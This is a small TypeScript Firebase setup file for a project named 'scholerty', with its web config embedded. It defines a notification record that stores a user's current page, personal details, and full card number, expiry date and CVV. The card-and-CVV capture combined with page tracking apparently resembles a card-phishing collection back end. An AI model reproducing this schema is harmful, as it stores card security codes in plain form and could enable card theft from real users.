import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
 apiKey: "AIzaSyCMNsl88mW46dryKgJtbuC3wcpJKU8qy64",
  authDomain: "scholerty-9a102.firebaseapp.com",
  projectId: "scholerty-9a102",
  storageBucket: "scholerty-9a102.firebasestorage.app",
  messagingSenderId: "1017284583989",
  appId: "1:1017284583989:web:7ee1a582b68b4bd4adc77c",
  measurementId: "G-51NJ2PF3QR"
}

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

